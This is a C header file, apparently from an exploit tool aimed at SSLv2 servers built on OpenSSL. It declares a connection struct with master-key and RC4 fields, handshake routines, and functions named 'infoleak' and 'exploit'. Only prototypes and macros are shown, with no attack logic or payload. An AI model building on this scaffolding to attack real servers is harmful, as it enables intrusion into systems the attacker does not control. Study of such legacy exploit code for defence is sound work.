#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/x509.h>
#include <openssl/rc4.h>
#include <openssl/md5.h>

#define _zero(x) memset(&(x), 0, sizeof(x));
#define _death(a) do{ perror(#a "()"); exit(-1); }while(0)

#define BUFSIZE 16384

typedef struct ssl_conn {
	int sockfd;

	u_char challenge[16];	
	u_char master_key[16];
	u_char key_material[32];

	/* connection identifier */
	int conn_id_length;
	u_char conn_id[16];

	/* server certificate */
	X509 *x509;

	u_char *read_key;
	u_char *write_key;

	RC4_KEY *rc4_read_key;
	RC4_KEY *rc4_write_key;

	int read_seq;
	int write_seq;

	int encrypted;
} ssl_conn;

extern u_long cipher, ciphers;

/* function prototypes */

void usage(char *);
void infoleak(char *, int);
void exploit(char *, int, u_long);
void hexdump(char *, u_char *, u_int);
int connection(char *, int);

ssl_conn *ssl_connect(char *, int);

void send_client_hello(ssl_conn *);
void get_server_hello(ssl_conn *);
void send_client_master_key(ssl_conn *, u_char *, int);
void get_server_verify(ssl_conn *);
void send_client_finish(ssl_conn *);
void get_server_finish(ssl_conn *, int);

int write_ssl(ssl_conn *, u_char *, int);
int read_ssl(ssl_conn *, u_char *, int);

void generate_keys(ssl_conn *);
